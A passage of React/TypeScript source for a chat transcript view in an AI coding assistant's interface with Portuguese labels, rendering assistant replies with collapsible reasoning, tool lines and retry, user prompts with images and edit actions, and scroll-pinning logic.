  const thinking = b.streaming && !b.text && b.tools.length === 0;
  return (
    <div className="msg-assistant">
      <span className="msg-avatar">
        <ZerithMark size={24} />
      </span>
      <div className="msg-body">
        {b.reasoning ? (
          <div className={"think" + (showReasoning ? " open" : "") + (thinking ? " live" : "")}>
            <button className="think-head" onClick={() => setShowReasoning(!showReasoning)} aria-expanded={showReasoning}>
              <Brain size={14} strokeWidth={2} />
              <span className="think-label">{thinking ? "Pensando…" : "Raciocínio"}</span>
              <ChevronRight size={14} strokeWidth={2} className="chev" />
            </button>
            {showReasoning ? <div className="think-body">{b.reasoning}</div> : null}
          </div>
        ) : null}
        {b.tools.length > 0 ? (
          <div className="tools">
            {b.tools.map((t, idx) => (
              <ToolLine key={`${t.id}-${idx}`} row={t} sessionId={props.sessionId} />
            ))}
          </div>
        ) : null}
        {b.text ? (
          <Markdown text={b.text} streaming={b.streaming} />
        ) : thinking && !b.reasoning ? (
          <span className="thinking-live" role="status">
            <Brain size={14} strokeWidth={2} />
            <span className="think-label">Pensando…</span>
          </span>
        ) : null}
        {b.error ? (
          <div className="callout danger" role="alert">
            <AlertTriangle size={16} strokeWidth={1.75} />
            <div>
              <strong>A resposta não terminou</strong>
              <p>{b.error}</p>
              {props.onRetry ? (
                <button type="button" className="btn btn-sm" onClick={props.onRetry}>
                  Tentar de novo
                </button>
              ) : null}
            </div>
          </div>
        ) : null}
        {props.sessionId && b.stored && !b.streaming ? (
          <TurnChanges sessionId={props.sessionId} messageId={b.stored} />
        ) : null}
        {b.text && !b.streaming ? (
          <div className="msg-actions">
            <CopyButton text={b.text} label="Copiar" />
            {props.onBranch && b.stored ? (
              <button
                className="copy-btn"
                onClick={() => props.onBranch!(b.stored!)}
                aria-label="Ramificar daqui"
                title="Ramificar daqui: nova conversa com tudo até esta resposta"
              >
                <GitBranch size={14} strokeWidth={2} />
                <span>Ramificar daqui</span>
              </button>
            ) : null}
          </div>
        ) : null}
      </div>
    </div>
  );
});


/** One prompt, with its attached images and its "Editar" action. Memoised: it
 * never changes while the answer below it streams. */
const UserRow = memo(function UserRow(props: {
  block: Block & { kind: "user" };
  onEdit?: (id: number, text: string) => void;
}) {
  const b = props.block;
  const onEdit = props.onEdit;
  // Attached images arrive as `![nome](<path>)` lines (Composer).
  const imgs = useMemo(() => [...b.text.matchAll(USER_IMG)], [b.text]);
  const text = imgs.length ? b.text.replace(USER_IMG, "").trim() : b.text;
  return (
    <div className="msg-user-row">
      <div className="msg-user">
        {imgs.length ? (
          <div className="msg-user-imgs">
            {imgs.map((m, j) => (
              <MdImage key={j} src={m[2]} alt={m[1]} />
            ))}
          </div>
        ) : null}
        {text}
      </div>
      {onEdit && b.id != null ? (
        <div className="msg-actions">
          <button
            className="copy-btn"
            onClick={() => onEdit(b.id!, b.text)}
            aria-label="Editar"
            title="Editar: nova conversa a partir daqui com esta mensagem no campo"
          >
            <Pencil size={14} strokeWidth={2} />
            <span>Editar</span>
          </button>
        </div>
      ) : null}
    </div>
  );
});

export function Transcript(props: {
  blocks: Block[];
  tail?: React.ReactNode;
  sessionId?: string | null;
  /** A turn is running: no edit/branch until it lands. */
  busy?: boolean;
  onEdit?: (id: number, text: string) => void;
  onBranch?: (id: number) => void;
  /** "Tentar de novo" on the newest failed answer. */
  onRetry?: () => void;
  /** Above the first block: history paging / load error. */
  head?: React.ReactNode;
}) {
  const box = useRef<HTMLDivElement>(null);
  const pinned = useRef(true);
  const [away, setAway] = useState(false);
  const onEdit = props.busy ? undefined : props.onEdit;
  const onBranch = props.busy ? undefined : props.onBranch;
  const onRetry = props.busy ? undefined : props.onRetry;
  let lastAssistant = -1;
  for (let i = props.blocks.length - 1; i >= 0; i--) {
    if (props.blocks[i].kind === "assistant") {
      lastAssistant = i;
      break;
    }
  }

  useEffect(() => {
    const el = box.current;
    if (!el) return;
    const onScroll = () => {
      pinned.current = el.scrollHeight - el.scrollTop - el.clientHeight < 80;
      setAway(!pinned.current);
    };
    el.addEventListener("scroll", onScroll);
    return () => el.removeEventListener("scroll", onScroll);
  }, []);

  // A prompt just sent: follow it even when the view was scrolled up.
  const userCount = props.blocks.reduce((n, b) => n + (b.kind === "user" ? 1 : 0), 0);
  const lastUserCount = useRef(userCount);
  if (userCount > lastUserCount.current) pinned.current = true;
  lastUserCount.current = userCount;

  // Scroll only the transcript: scrollIntoView would also move every
  // overflow:hidden ancestor (the sheet, the shell) and shift the layout.
  const toEnd = () => {
    const el = box.current;
    if (el && pinned.current) el.scrollTop = el.scrollHeight;
  };
  useEffect(toEnd, [props.blocks, props.tail]);

  // An image that finishes loading grows the stack without a new block;
  // keep the view pinned to the bottom when it was there.
  useEffect(() => {
    const stack = box.current?.firstElementChild;
    if (!stack) return;
    const ro = new ResizeObserver(toEnd);
    ro.observe(stack);
    return () => ro.disconnect();
  }, []);

  return (
    <div className="transcript" ref={box}>
      <div className="stack">
        {props.head}
        {props.blocks.length === 0 && !props.head ? (
          <div className="convo-empty">
            <ZerithMark size={32} />
            <p>Conversa vazia. Escreva abaixo para começar; use / para comandos e @ para citar arquivos.</p>
          </div>
        ) : null}
        {(() => {
          let aOrd = 0;
          let uOrd = 0;
          let nOrd = 0;
          const rendered = props.blocks.map((b, i) => {
            // A block the event did not touch keeps its reference, so `memo`
            // skips it: only the answer being written is re-rendered. Keying
            // by per-kind ordinal keeps keys stable across streaming→stored
            // transitions and borrowIds while preventing cross-kind collisions.
            if (b.kind === "user") {
              return <UserRow key={`u-${uOrd++}`} block={b} onEdit={onEdit} />;
            }
            if (b.kind === "subagent") {
              return <SubagentCard key={`sub-${b.id}`} block={b} />;
            }
            if (b.kind === "note" && b.btw) {
              return <BtwNote key={`btw-${b.btw.id}`} btw={b.btw} />;
            }
            if (b.kind === "note" && b.learned?.length) {
              return <LearnedNote key={`n-${nOrd++}`} text={b.text} items={b.learned} />;
            }
            if (b.kind === "note") {
              return (
                <div key={`n-${nOrd++}`} className="msg-note">
                  <Info size={14} strokeWidth={2} />
                  <span>{b.text}</span>
                </div>
              );
            }
            return (
              <AssistantBlock
                key={`a-${aOrd++}`}
                block={b}
                sessionId={props.sessionId}
                onBranch={onBranch}
                onRetry={i === lastAssistant && b.error ? onRetry : undefined}
              />
            );
          });
          return (
            <>
              {rendered}
              {/*
                The answer block is born on the first event, so a slow turn used to
                look frozen: the dots stand in for it while the turn is running.
              */}
              {props.busy && !props.blocks.some((b) => b.kind === "assistant" && b.streaming) ? (
                <AssistantBlock
                  key={`a-${aOrd}`}
                  block={{ kind: "assistant", text: "", reasoning: "", tools: [], streaming: true }}
                  sessionId={props.sessionId}
                />
              ) : null}
            </>
          );
        })()}
        {props.tail}
      </div>
      {away ? (
        <button
          type="button"
          className="btn btn-sm"
          style={{ position: "sticky", bottom: 8, marginLeft: "auto", display: "block" }}
          onClick={() => {
            const el = box.current;
            if (!el) return;
            pinned.current = true;
            setAway(false);
            el.scrollTop = el.scrollHeight;
          }}
        >
          Ir para o fim
        </button>
      ) : null}
    </div>
  );
}
